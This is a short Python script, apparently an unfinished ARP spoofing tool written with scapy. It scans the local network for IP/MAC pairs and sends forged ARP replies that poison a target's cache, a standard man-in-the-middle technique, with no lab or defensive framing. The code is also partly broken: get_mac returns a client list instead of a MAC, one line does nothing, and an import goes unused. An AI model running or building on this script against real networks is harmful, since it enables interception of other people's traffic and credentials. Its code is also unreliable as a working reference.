#!/usr/bin/env python
import scapy.all as scapy
import time

def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    answered_list[0][1].hwsrc
    client_list = []
    for element in answered_list:
        client_dict = {"IP": element[1].psrc, "MAC": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list

def spoof(target_ip, spoof_ip):

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="00:0C:29:22:B8:76", psrc=spoof_ip)
    scapy.send(packet)
